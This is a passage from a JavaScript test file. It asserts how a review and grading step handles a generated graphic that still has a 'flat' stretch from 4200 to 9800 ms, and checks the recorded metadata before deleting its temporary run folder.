  assert.match(grades[0].user, /visual world: Eyeballs as light/); assert.match(grades[0].user, /Our automatic checks found: Flat at/)
  // Still flat after the revision, but the review and our hard checks passed: kept, its flat stretch recorded.
  assert.ok(result.meta, result.reason)
  assert.deepEqual(plain(result.meta.flat), [{ fromMs: 4200, toMs: 9800 }])
  assert.equal(result.meta.builds, b.stressed.length)
  assert.deepEqual(plain(m.readCustomGraphic(run, result.meta.comp).meta.flat), [{ fromMs: 4200, toMs: 9800 }])
  fs.rmSync(run, { recursive: true, force: true })
})
